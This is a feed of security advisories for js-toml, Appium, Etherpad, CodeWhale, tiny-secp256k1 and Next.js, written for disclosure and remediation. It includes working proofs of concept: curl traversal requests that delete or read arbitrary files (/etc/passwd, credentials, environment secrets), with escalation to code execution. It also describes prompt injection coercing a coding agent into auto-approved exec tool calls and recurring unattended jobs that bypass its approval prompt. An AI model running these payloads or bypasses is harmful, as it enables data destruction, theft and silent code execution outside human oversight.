  2. Error-contract violation. The library signals invalid input via SyntaxParseError (see src/load/exception.ts; the entire test suite asserts SyntaxParseError). Consumers that follow this contract —

    try { load(input); }
catch (e) {
  if (e instanceof SyntaxParseError) return badRequest();
  throw e; // unexpected -> propagates
}

    — will re-throw the RangeError instead of treating the input as malformed, turning malformed input into an unexpected fatal error.

Impact

  • Unauthenticated attacker who can supply a TOML string to an application using js-toml can force load() to throw a non-SyntaxParseError error.
  • If the error is not caught by a generic handler, the Node.js process terminates (availability impact).
  • Even when caught generically, the documented/expected error type contract is broken, which can bypass input-validation branches that key off SyntaxParseError.

No confidentiality or integrity impact. The error is thrown synchronously and is catchable, so a consumer that catches all exceptions is not crashed — this is why the severity is assessed Low–Medium rather than High.

Affected code / root cause

There is no depth bound anywhere in the parse pipeline. Recursion occurs in (at least) two independent places:

  1. Parser (recursive descent). src/load/parser.ts — array / inlineTable rules recurse through value for each nesting level.
  2. Interpreter (tree walk). src/load/interpreter.ts — assignValue, createTable, getOrCreateArray recurse per dotted-key segment, and cleanInternalProperties recurses per object depth.

Because there is no configurable or hard limit, the recursion depth is bounded only by the V8 stack, and overflow surfaces as a raw RangeError.

Steps to reproduce (PoC)

Environment used: Node.js v20, js-toml@1.1.2.

import { load, SyntaxParseError } from 'js-toml';

function probe(label, toml) {
  try {
    load(toml);
    console.log(`[OK]            ${label}`);
  } catch (e) {
    const expected = e instanceof SyntaxParseError;
    console.log(`[${e.constructor.name}${expected ? '' : ' (UNEXPECTED)'}] ${label}: ${String(e.message).split('\n')[0]}`);
  }
}

// 1) Deeply nested arrays  (~2 KB payload)
probe('nested array depth 1000', 'x = ' + '['.repeat(1000) + ']'.repeat(1000));

// 2) Deeply nested inline tables
let v = '1';
for (let i = 0; i < 1000; i++) v = `{ a = ${v} }`;
probe('nested inline table depth 1000', 'x = ' + v);

// 3) Deep dotted key (interpreter recursion)
const key = Array.from({ length: 5000 }, (_, i) => 'a' + i).join('.');
probe('dotted key depth 5000', `${key} = 1`);

Observed output

[RangeError (UNEXPECTED)] nested array depth 1000: Maximum call stack size exceeded
[RangeError (UNEXPECTED)] nested inline table depth 1000: Maximum call stack size exceeded
[RangeError (UNEXPECTED)] dotted key depth 5000: Maximum call stack size exceeded

Each case throws RangeError, not SyntaxParseError. Overflow occurs in single-digit milliseconds, so it is not a CPU-exhaustion issue — it is an immediate, deterministic abort.

Notes on thresholds (machine-dependent; exact numbers vary by stack size):

  • Nested arrays / inline tables overflow at roughly depth ~1000 (parser recursion).
  • Dotted keys overflow at roughly depth ~5000 (interpreter recursion); depth 1000 still succeeds.

Suggested remediation

Enforce an explicit, documented maximum nesting/key depth and surface violations as SyntaxParseError (consistent with all other invalid-input handling). For example:

  • Track current depth in the parser/interpreter and throw SyntaxParseError (e.g. "Maximum nesting depth exceeded") once a configurable limit (e.g. 100–1000) is reached, before the native stack overflows.
  • As a defensive backstop, wrap the top-level load() body so that a thrown RangeError from stack exhaustion is converted into a SyntaxParseError, guaranteeing the documented error contract holds for all malformed input.

A configurable limit (with a safe default) is preferable so legitimate deep documents can opt into a higher bound.

Disclosure

Reported privately via GitHub Security Advisory. Happy to provide additional reproducers or test against a candidate patch.

References

  • https://github.com/sunnyadn/js-toml/security/advisories/GHSA-3g82-77xr-68x5
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63386
  • https://github.com/sunnyadn/js-toml/commit/4e10acf1f99ff3cb443c58b8f0a57664e41e87c6
  • https://github.com/sunnyadn/js-toml/releases/tag/v1.1.3
  • https://github.com/advisories/GHSA-3g82-77xr-68x5

entry.title: [@appium/storage-plugin] appium allows unauthenticated arbitrary file/directory deletion in @appium/storage-plugin
entry.content:
Summary

The Appium storage plugin exposes an HTTP endpoint POST /storage/delete that takes a user-supplied name and deletes it from the server storage folder. The handler passes name straight into path.join(storageRoot, name) and then fs.rimraf() without any path sanitization. By sending a name containing ../ sequences, an unauthenticated remote client can escape the storage root and recursively delete arbitrary files and directories that the Appium process user can write, anywhere on the host filesystem.

The same plugin's upload path validates the name via fs.sanitizeName (requireValidItemOptions), but the delete path does not an asymmetry that makes the missing validation unambiguous.

Details

Published build (node_modules/@appium/storage-plugin/build/lib/storage.js), and source (packages/storage-plugin/lib/):

  • packages/storage-plugin/lib/storage.ts:65-75 — Storage.delete():
    async delete(name: string): Promise<boolean> {
  if (name.toLowerCase().endsWith(TMP_EXT)) {
    return false;
  }
  const destinationPath = path.join(this._root, name);   // <-- no sanitization
  if (!(await fs.exists(destinationPath))) {
    return false;
  }
  await fs.rimraf(destinationPath);                       // <-- recursive delete
  return true;
}
  • packages/storage-plugin/lib/plugin.ts:77-83 — handler passes raw body:
    STORAGE_HANDLERS.deleteStorageItem = async function deleteStorageItem(req) {
  return await executeStorageMethod(
    async (storage) => await storage.delete(parseRequestArgs(req, ['name']).name),
  );
};

parseRequestArgs (plugin.ts:94-106) only checks that the key exists; it does not validate the value.

  • Contrast — the upload path does sanitize: storage.ts:53-54 add() → requireValidItemOptions() (storage.ts:236-256) rejects any name that differs from fs.sanitizeName(name). delete() skips this entirely.

PoC

  1. Install and start the server with the storage plugin:
    npm install appium@3.5.0
./node_modules/.bin/appium plugin install --source=npm @appium/storage-plugin
./node_modules/.bin/appium --use-plugins=storage --address 127.0.0.1 --port 4723

(Default --address is 0.0.0.0; 127.0.0.1 used here for a contained test.)

  1. Plant a victim file/dir outside the storage root, then delete via traversal:
    mkdir -p /tmp/pv_dir && echo SECRET > /tmp/pv_dir/important.txt
echo single > /tmp/pv_file.txt

curl -s -X POST http://127.0.0.1:4723/storage/delete \
  -H 'Content-Type: application/json' \
  -d '{"name":"../../../../../../../../../../tmp/pv_file.txt"}'
# -> {"value":true}

curl -s -X POST http://127.0.0.1:4723/storage/delete \
  -H 'Content-Type: application/json' \
  -d '{"name":"../../../../../../../../../../tmp/pv_dir"}'
# -> {"value":true}

Impact

An unauthenticated attacker who can reach the Appium HTTP port (network by default, or cross-origin via a victim browser due to default CORS + no auth) can recursively delete any file or directory writable by the Appium process user. On CI runners, device farms, and developer machines this enables destruction of source trees, build artifacts, SSH keys, configuration, or the OS user profile data loss and denial of service. Appium frequently runs with broad privileges on shared device-lab hosts, amplifying impact.

References

  • https://github.com/appium/appium/security/advisories/GHSA-jwgx-mp9m-jwcr
  • https://nvd.nist.gov/vuln/detail/CVE-2026-58192
  • https://github.com/appium/appium/pull/22362
  • https://github.com/appium/appium/commit/5fee01752f2782e96fbe64fd13520b433d4a7535
  • https://github.com/appium/appium/releases/tag/%40appium/storage-plugin%401.1.6
  • https://github.com/advisories/GHSA-jwgx-mp9m-jwcr

entry.title: [ep_etherpad-lite] Etherpad: Pre-auth arbitrary file read
entry.content:
Summary

An unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.

Details

Etherpad serves plugin static assets through src/node/utils/Minify.ts. The request path is first passed through the canonical sanitizer src/node/utils/sanitizePathname.ts, which is careful to convert backslashes to forward slashes only on Windows:

// src/node/utils/sanitizePathname.ts:11-20
p = pathApi.normalize(p);
if (pathApi.isAbsolute(p)) throw new Error(`absolute paths are forbidden: ${p}`);
if (p.split(pathApi.sep)[0] === '..') throw new Error(`directory traversal: ${p}`);
// THIS CONVERSION MUST ONLY BE DONE ON WINDOWS, otherwise on POSIXish systems '..\\' in the input
// pathname would not be normalized away before being converted to '../'.
if (pathApi.sep === '\\') p = p.replace(/\\/g, '/');

On Linux a backslash is an ordinary filename byte, so an input segment like ......\test contains no ./.. path components and passes every check in sanitizePathname unchanged. The project's own test suite confirms this: src/tests/backend-new/specs/sanitizePathname.ts:62 lists ['posix', '..\foo'] among the accepted paths (returned unchanged).

The vulnerability is that Minify.ts then performs that Windows‑only conversion unconditionally, after the sanitizer has run, justified by a comment asserting the opposite of the invariant above:

// src/node/utils/Minify.ts:171-186
const match = filename.match(/^plugins\/([^/]+)(\/(?:(static\/.*)|.*))?$/);
if (match) {
const library = match[1];
const libraryPath = match[2] || '';
if (plugins.plugins[library] && match[3]) {
const plugin = plugins.plugins[library];
const pluginPath = plugin.package.realPath;      // for 'ep_etherpad-lite' == <root>/src
filename = path.join(pluginPath, libraryPath);   // -> absolute path, backslashes preserved
// ... "This conversion does not introduce a directory
// traversal vulnerability because all '..\\' substrings have already been removed by
// sanitizePathname."                              // <-- FALSE on POSIX
filename = filename.replace(/\\/g, '/');          // <-- reintroduces ../ AFTER the check
}

After line 186 the string becomes a real traversal (/src/static/../../../../etc/passwd) with no re‑normalization and no containment check before the filesystem calls at Minify.ts:248 (fs.stat) and Minify.ts:315 (fs.readFile). Because path.join at line 179 produced an absolute path, path.resolve(ROOT_DIR, filename) discards ROOT_DIR entirely, and POSIX path.resolve collapses surplus .. at /, so the payload is root‑depth‑agnostic.

The route is reachable pre‑authentication. It is registered on the expressPreSession hook:

// src/ep.json
{ "name": "static", "hooks": { "expressPreSession": "ep_etherpad-lite/node/hooks/express/static" } }
// src/node/hooks/express/static.ts:38
app.all('/static/*filename', minify);

and expressPreSession runs before the auth middleware:

// src/node/hooks/express.ts:244-247
await hooks.aCallAll('expressPreSession', {app, settings});   // static route registered here
app.use(exports.sessionMiddleware);
app.use(webaccess.checkAccess);                                // auth runs AFTER

The plugin branch is always taken because src/static/js/pluginfw/plugins.ts:153-158 unconditionally registers the core pseudo‑plugin ep_etherpad-lite with package.realPath = /src.

Two decode facts make the exploit functional: Express 5 / path‑to‑regexp v8 decode wildcard params per segment, once ((v) => v.split('/').map(decodeURIComponent)), so req.params.filename.join('/') (Minify.ts:147) yields the once‑decoded path fed to the sanitizer, and %5C (encoded backslash) is the only working separator (%2F decodes to /, is re‑split, and is rejected by the split('/')[0] === '..' guard).

PoC

Applies to a default production deployment (no special configuration; works on Linux, e.g. the Docker image or a systemd source install). Replace TARGET:9001 with the instance.

  1. Read /etc/passwd (or any file) with no authentication. --path-as-is prevents the client from folding the traversal:
curl --path-as-is \
'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'

Other high‑value reads (over‑shoot the .. depth; it is absorbed at /):

admin password + secrets, root-agnostic via /proc/self/cwd

curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/settings.json'
curl --path-as-is
'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/credentials.json'

on docker-compose deployments the admin password is an env var: curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/environ'

Each response returns the raw file bytes (with a harmless Content-Type: false header for extension‑less targets, Node coerces the value and does not throw).

  1. Escalate to RCE. Recover the admin credential from the files read in step 1, then:

mint an admin session

curl -i -X POST 'http://TARGET:9001/admin-auth/' \
-H "Authorization: Basic $(printf 'admin:PASSWORD' | base64)"
# -> 200 + Set-Cookie: <prefix>express_sid=...

Using that express_sid cookie, connect to the /pluginfw/installer Socket.IO namespace (gated only on session.user.is_admin, src/node/hooks/express/adminplugins.ts:22) and emit install for an attacker‑controlled ep_* plugin. Etherpad require()s the plugin's code in‑process during plugins.update() (src/static/js/pluginfw/shared.ts:30), executing arbitrary code as the Etherpad user.

Impact

  • Type: Improper limitation of a pathname → unauthenticated arbitrary file read, with potential to remote code execution.
  • Access required: None. The vulnerable route is served before the authentication/authorization middleware, so it is exploitable by any client that can reach the HTTP port, regardless of requireAuthentication, requireAuthorization, or users configuration.
  • What an attacker can access: any file readable by the Etherpad process user, including settings.json/credentials.json (admin password, sessionKey, database credentials, SSO client secrets), /proc/self/environ (env‑supplied secrets such as ADMIN_PASSWORD, DB_PASS), the pad database, TLS private keys, and OS files such as /etc/passwd.
  • Escalation: the disclosed admin password yields an admin session; the admin plugin installer then provides in‑process code execution, i.e. full server takeover. Even without the plugin step, admin access permits rewriting the entire configuration (saveSettings + restartServer) and exfiltrating all stored data.
  • Who is impacted: every operator running an affected version, most severely those exposing Etherpad directly to untrusted networks. A reverse proxy does not mitigate it, the traversal uses %5C, which proxies forward unchanged.

References

  • https://github.com/ether/etherpad/security/advisories/GHSA-mc8w-wjhw-45x5
  • https://github.com/ether/etherpad/pull/8081
  • https://github.com/ether/etherpad/commit/9c8d16d50e2fdfd9693ab35c43280410cb4db2fc
  • https://github.com/advisories/GHSA-mc8w-wjhw-45x5

entry.title: [codewhale] CodeWhale: exec_shell parallel-readonly classifier auto-approves fd/rg/git grep exec flags enabling silent RCE
entry.content:
Maintainer resolution

The CodeWhale maintainers validated this report. CodeWhale 0.8.67 and earlier are affected. Version 0.9.0 contains the fix in commit 208421b9d23d81cea3311a1eeb2a2ea81d637686. Users should upgrade to 0.9.0 or later. The original reporter analysis is preserved below.

Summary

The interactive Agent profile of DeepSeek-TUI (CodeWhale) is explicitly documented to gate every shell command behind an approval prompt (config.rs:3725-3736). However, ExecShellTool::approval_requirement_for(&tool_input) downgrades the requirement from Required to Auto for any command the classifier deems "parallel read-only" (shell.rs:2314-2320). registered_tool_approval_required returns false for Auto before the auto_approve check runs (turn_loop.rs:37-38), so no prompt is shown even for a user who never enabled YOLO. The classifier is_parallel_readonly_command (command_safety.rs:389) rejects only shell metacharacters and then matches the flag-stripped base command name against an allowlist that includes fd, rg, and git grep. Those tools execute arbitrary external programs through documented flags (fd -x/--exec, rg --pre, git grep --open-files-in-pager) that need no shell metacharacters — yielding silent arbitrary-program execution in the default profile. Same silent-RCE class as CVE-2026-45311 (run_tests) but via a different, unpatched tool and code path.

Root Cause

approval_requirement_for downgrades exec_shell to Auto when exec_shell_input_is_parallel_readonly returns true (shell.rs:2314-2320). The classifier strips all flags and matches the base command name against PARALLEL_READONLY_PREFIXES (command_safety.rs:363-385, 419-433). fd/rg are absent from COMMAND_ARITY, so fd -x cp {} /tmp/exfil canonicalizes to "fd" ∈ allowlist. The only remaining gate at the execute sink is analyze_command, which rates fd/rg as Safe (SAFE_COMMANDS command_safety.rs:527,530), so the SafetyLevel::Dangerous-only block (shell.rs:2408) never fires. Default execpolicy is empty (engine.rs:494) → Skip. Interactive-origin auto_review safety_floor holds only Publish (auto_review.rs:344-357), not interactive shell.

Impact

Arbitrary external program execution (any binary, any argv, including a repo-committed script) on the developer host, with no approval prompt, in the default interactive Agent profile — bypassing the boundary config.rs:3725-3736 explicitly promises. Identical outcome to seed CVE-2026-45311 via a different, unpatched tool.

Proof of Concept

Model coerced (via indirect prompt injection from repo file / issue / fetched page — the seed threat model, in scope per SECURITY.md:48) to emit:

{"name":"exec_shell","arguments":{"command":"fd -u -tf -x ./pwn.sh"}}

Alternatives (all metachar-free, all auto-approved): fd -tf -x cp {} /tmp/exfil; rg --pre /tmp/evil.sh --pre-glob '*' needle .; git grep --open-files-in-pager=/tmp/evil.sh needle.

Attack Chain

  1. Entry. Agent ingests attacker-controlled content; injected instruction coerces the model to emit exec_shell {"command":"fd -u -tf -x ./pwn.sh"}.
    • Guard: none — reading content and model tool-calls are by design (seed threat model: indirect prompt injection).
    • Bypass proof: n/a (in-scope by design per SECURITY.md:48).
  2. Gate — approval requirement. turn_loop.rs:1738 → spec.approval_requirement_for(&input) → shell.rs:2314-2320 exec_shell_input_is_parallel_readonly.
    • Guard: metachar filter (command_safety.rs:394-400) + base-name allowlist.
    • Bypass proof: the string contains none of ; & | > < \ $(or newlines;-x isfd's own exec mechanism (no shell). classify_commandstrips-u -tf -x, positionals [fd, ./pwn.sh]; fd∉COMMAND_ARITY→ canonical"fd"∈PARALLEL_READONLY_PREFIXES→ returns true. Maintainer testparallel_readonly_command_classifier_is_strict(command_safety.rs:1162+) confirms barefd/rg` classify parallel-readonly.
  3. Gate — prompt decision. registered_tool_approval_required(name, Auto, auto_approve).
    • Guard: the approval prompt itself.
    • Bypass proof: requirement == Auto returns false at turn_loop.rs:37-38 unconditionally, before !auto_approve. No prompt regardless of user settings. Empty execpolicy → Skip; interactive safety_floor returns NoChange for fd.
  4. Sink. ExecShellTool::execute (shell.rs:2334) → analyze_command.
    • Guard: SafetyLevel::Dangerous block (shell.rs:2408).
    • Bypass proof: fd ∈ SAFE_COMMANDS (command_safety.rs:530) → analyze_command returns Safe; not Dangerous → not blocked. Child runs the attacker's program.
  5. Impact. Silent arbitrary-program execution on the developer host, no approval prompt, default interactive Agent profile.

Bypass Evidence

  • Present on latest release tag v0.8.67: turn_loop.rs:37-38 Auto→return false; shell.rs:2314-2320 override; command_safety.rs allowlist includes "rg","fd","git grep"; SAFE_COMMANDS includes "rg","fd"; fd/rg absent from COMMAND_ARITY. command_safety.rs / turn_loop.rs finding-critical functions byte-identical v0.8.67↔HEAD.
  • Maintainer's own test parallel_readonly_command_classifier_is_strict confirms bare rg/fd classify parallel-readonly and only metachar forms are rejected.

Affected Versions

<= 0.8.67 (present on latest release tag v0.8.67 and HEAD 6a3403e).

Suggested Fix

Remove exec-capable tools (fd, rg, git grep) from PARALLEL_READONLY_PREFIXES, or make the classifier reject their exec flags (-x/--exec, --pre, --open-files-in-pager), so a code-executing invocation cannot be auto-approved as read-only.

Reported by zx (Jace)

References

  • https://github.com/codewhale-hq/Codewhale/security/advisories/GHSA-3mgh-93r5-r7jf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-83816
  • https://github.com/codewhale-hq/Codewhale/commit/208421b9d23d81cea3311a1eeb2a2ea81d637686

  • https://github.com/advisories/GHSA-3mgh-93r5-r7jf

entry.title: [codewhale] CodeWhale: Automation auto_approve defaults to true, bypassing the task-path hardening fix for silent recurring agent execution
entry.content:
Maintainer resolution

The CodeWhale maintainers validated this report. CodeWhale 0.8.67 and earlier are affected. Version 0.9.0 contains the fix in commit 208421b9d23d81cea3311a1eeb2a2ea81d637686. Users should upgrade to 0.9.0 or later. The original reporter analysis is preserved below.

Summary

CVE-2026-45374 (GHSA-72w5-pf8h-xfp4) hardened the task path so auto-approval must be opted into explicitly: add_task uses req.auto_approve.unwrap_or(false) (task_manager.rs:868). The automation subsystem was not hardened in kind. AutomationRecord::task_auto_approve() resolves an omitted auto_approve to DEFAULT_AUTOMATION_AUTO_APPROVE = true (automation_manager.rs:29, 101-103), and enqueue_run_task builds the NewTaskRequest with auto_approve: Some(automation.task_auto_approve()) — i.e. an explicit Some(true) (automation_manager.rs:766). Because the field is Some, unwrap_or(false) returns true and the seed-2 default is bypassed. That true propagates to ApprovalMode::Bypass (runtime_threads.rs:2253), where the background approval loop auto-approves every tool call with no human present (runtime_threads.rs:3383-3416). One approved automation_create becomes a durable, recurring, fully auto-approved agent. Same insecure-default class as CVE-2026-45374, on a different, unpatched subsystem.

Root Cause

Sibling durable defaults in the same struct are safe — DEFAULT_AUTOMATION_ALLOW_SHELL = false and DEFAULT_AUTOMATION_TRUST_MODE = false (automation_manager.rs:27-28) — while DEFAULT_AUTOMATION_AUTO_APPROVE alone defaults true (:29). create_automation stores auto_approve: None when omitted (:422); task_auto_approve() resolves None→true (:101-103); enqueue_run_task passes Some(true) (:766), defeating add_task's unwrap_or(false) seed fix. The automation_create tool schema also declares "auto_approve": {"type":"boolean","default":true} (tools/automation.rs:49) while sibling allow_shell/trust_mode default false.

Impact

A single approved automation_create yields a durable, recurring, fully auto-approved agent. Every scheduled fire silently authorizes mutating tools (file writes, apply_patch, git, MCP writes) with no prompt; combined with allow_shell:true in the create call, recurring silent RCE with no human present. Even without allow_shell, every recurring run silently authorizes all non-shell mutating tools. Same class as seed CVE-2026-45374.

Proof of Concept

Prompt injection convinces the model to create a benign-sounding recurring job (single human approval on the automation_create call):

{"name":"automation_create","arguments":{
  "name":"nightly-maintenance",
  "prompt":"Fetch latest and run project setup script",
  "rrule":"FREQ=HOURLY;INTERVAL=1",
  "allow_shell":true
}}

(auto_approve omitted → stored None → resolves to true on every run.)

Attack Chain

  1. Entry. Prompt injection → model creates a recurring job via automation_create with auto_approve omitted.
    • Guard: automation_create is Required (tools/automation.rs:61-63) — user sees ONE approval prompt.

entry.title: [@bitcoin-js/tiny-secp256k1-asmjs] tiny-secp256k1: Stale buffer after ignored wasm failure accepts invalid infinity tweak
entry.content:
Summary

The three-argument xOnlyPointAddTweakCheck path ignores the wasm failure return and compares an unchanged input buffer. When the tweak result is the point at infinity, this stale-buffer comparison can return true for an invalid derivation.

Details

xOnlyPointAddTweakCheck in index.ts has two code paths. The path taken when the caller omits tweakParity discards the return value of the wasm call and compares whatever the shared input buffer holds.

try {
    X_ONLY_PUBLIC_KEY_INPUT.set(point);
    X_ONLY_PUBLIC_KEY_INPUT2.set(resultToCheck);
    TWEAK_INPUT.set(tweak);
    if (hasParity) {
      return wasm.xOnlyPointAddTweakCheck(tweakParity) === 1;
    } else {
      wasm.xOnlyPointAddTweak();
      const newKey = X_ONLY_PUBLIC_KEY_INPUT.slice(
        0,
        validate.X_ONLY_PUBLIC_KEY_SIZE
      );
      return compare(newKey, resultToCheck) === 0;
    }

x_only_point_add_tweak in lib.rs returns -1 and leaves X_ONLY_PUBLIC_KEY_INPUT untouched when the tweak addition fails.

pub extern "C" fn x_only_point_add_tweak() -> i32 {
    unsafe {
        let mut xonly_pk = jstry!(x_only_pubkey_parse(X_ONLY_PUBLIC_KEY_INPUT.as_ptr()), 0);
        let mut pubkey = PublicKey::new();
        if secp256k1_xonly_pubkey_tweak_add(
            get_context(),
            &mut pubkey,
            &xonly_pk,
            TWEAK_INPUT.as_ptr(),
        ) != 1
        {
            // infinity point
            return -1;
        }

The buffer still holds point, which the caller wrote immediately before the call. newKey therefore equals point, and the comparison against resultToCheck succeeds whenever the caller passes resultToCheck equal to point.

secp256k1_xonly_pubkey_tweak_add in upstream main_impl.h returns 0 only when the internal key fails to load or the tweak helper fails.

if (!secp256k1_xonly_pubkey_load(ctx, &pk, internal_pubkey)
    || !secp256k1_ec_pubkey_tweak_add_helper(&pk, tweak32)) {
    return 0;
}

The helper in secp256k1.c fails on scalar overflow or on an infinite result.

static int secp256k1_ec_pubkey_tweak_add_helper(secp256k1_ge *p, const unsigned char *tweak32) {
    secp256k1_scalar term;
    int overflow = 0;
    secp256k1_scalar_set_b32(&term, tweak32, &overflow);
    return !overflow && secp256k1_eckey_pubkey_tweak_add(p, &term);
}

validateTweak in validate.ts already rejects a tweak at or above the group order, so overflow is excluded and the only remaining cause is lift_x(point) + tweak * G reaching the point at infinity.

The parity path is correct for the same input. secp256k1_xonly_pubkey_tweak_add_check returns 0 in that case. The two documented forms of the same check disagree.

xOnlyPointAddTweak also disagrees with the check, returning null for the exact inputs the check accepts.

The condition is untested. schnorr.js skips every xOnlyPointAddTweakCheck assertion for the infinity vectors present in its own fixtures.

const res = secp256k1.xOnlyPointAddTweak(f.pubkey, f.tweak);
if (f.result === null) {
  t.same(res, f.result, `xOnlyPointAddTweak returns null when G pubkey and n - 1 tweak used`);
  continue;
}

PoC

Both witnesses are already present in the project fixtures at schnorr.json as the two vectors with a null result, and both pass every validator in validate.ts.

import * as secp256k1 from "tiny-secp256k1";

const hex = (s) => Uint8Array.from(Buffer.from(s, "hex"));

// x coordinate of G, and the tweak n - 1
const point = hex("79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798");
const tweak = hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140");

// lift_x(point) + tweak * G is the point at infinity, no tweaked key exists
console.log(secp256k1.xOnlyPointAddTweak(point, tweak));
// null

console.log(secp256k1.xOnlyPointAddTweakCheck(point, tweak, point, 0));
// false   correct, the parity form uses the C check

console.log(secp256k1.xOnlyPointAddTweakCheck(point, tweak, point));
// true    wrong, the three argument form compares point against itself

A second witness from the same fixture uses the x coordinate of 2 * G with tweak n - 2.

const point2 = hex("c6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee5");
const tweak2 = hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036413f");
console.log(secp256k1.xOnlyPointAddTweakCheck(point2, tweak2, point2));   // true

Both were executed against the published secp256k1.wasm from npm 2.2.4 under wasmtime, driving the exports through the exact write, call, slice, zero sequence index.ts performs.

-- witness x(G), n-1
   xOnlyPointAddTweak(P, t)      = None
   check(P, t, P, parity=0)      = False
   check(P, t, P, parity=1)      = False
   check(P, t, P)   3-arg form   = True
   raw wasm return               = -1
   buffer after call unchanged   = True 79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798

-- witness x(2G), n-2
   xOnlyPointAddTweak(P, t)      = None
   check(P, t, P, parity=0)      = False
   check(P, t, P, parity=1)      = False
   check(P, t, P)   3-arg form   = True
   raw wasm return               = -1
   buffer after call unchanged   = True c6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee5

-- control, ordinary tweak 5 on x(G)
   xOnlyPointAddTweak            = (1, 'fff97bd5755eeea420453a14355235d382f6472f8568a18b2f057a1460297556')
   check 3-arg with correct result = True
   check 3-arg with wrong result   = False

The control confirms the three argument form is otherwise correct, so the defect is specific to the failure path.

An attacker generated witness follows the same construction with a hash derived tweak.

tweak = 2ae431167097f01e131d3e3fd000044e79eb64f5391d594ec311d4a56a38c1e3
point = d14530c85d0169da4e4be4642f2cdaad14fb0421b690df617d00366b5f1ca832
lift_x(point) + tweak * G = infinity
xOnlyPointAddTweakCheck(point, tweak, point) === true

Impact

The three-argument helper can return true for an internal key and tweak whose derived point is at infinity. Protocols that use this result to validate a derived output can accept an invalid key when the caller controls the point, tweak, and comparison value.

Affected versions

  • tiny-secp256k1: 2.1.0 through 2.2.4.
  • @bitcoin-js/tiny-secp256k1-asmjs: 2.2.2 through 2.2.4.

The xOnlyPointAddTweakCheck API first appears in tiny-secp256k1 2.1.0. Static inspection of the integrity-checked asm.js releases confirms the same ignored return value and unchanged-buffer path when the tweak result is infinity. The WASM reproduction above is not an asm.js runtime measurement.

Remediation

Upgrade tiny-secp256k1 and @bitcoin-js/tiny-secp256k1-asmjs, as applicable, to 2.2.5 or a later patched release. The path without tweakParity now checks the backend's failure result before reading and comparing the output buffer. A tweak that produces the point at infinity returns false.

References

  • Fix: Reject failed infinity tweaks before comparing the output

References

  • https://github.com/bitcoinjs/tiny-secp256k1/security/advisories/GHSA-hj9c-qx2w-g7mh
  • https://nvd.nist.gov/vuln/detail/CVE-2026-107853
  • https://github.com/bitcoinjs/tiny-secp256k1/commit/ba1af1fceea95967a172c6438ed9302730bb7c01
  • https://github.com/bitcoinjs/tiny-secp256k1/releases/tag/v2.2.5
  • https://github.com/advisories/GHSA-hj9c-qx2w-g7mh

entry.title: [next] Next.js: SVG rejection bypass in the image optimization
entry.content:
On self-hosted deployments, the Next.js image optimizer (/_next/image) can be made to process an attacker-supplied SVG even when SVG support is disabled with dangerouslyAllowSVG: false (the default). This reaches an SVG parser the application intended to keep disabled, increasing exposure to denial of service and SVG decoder vulnerabilities.

entry.title: [next] Next.js: HttpOnly cookie exposure through internal response header on Next.js Edge runtime routes
entry.content:
Next.js applications that set cookies through NextResponse on Edge runtime routes — App Router route handlers and Pages Router Edge API routes — send an internal x-middleware-set-cookie header in the public response, duplicating the cookie value and its attributes. This makes HttpOnly cookies, such as session tokens, readable by JavaScript running on the same origin when an application sets a sensitive cookie on an affected response.
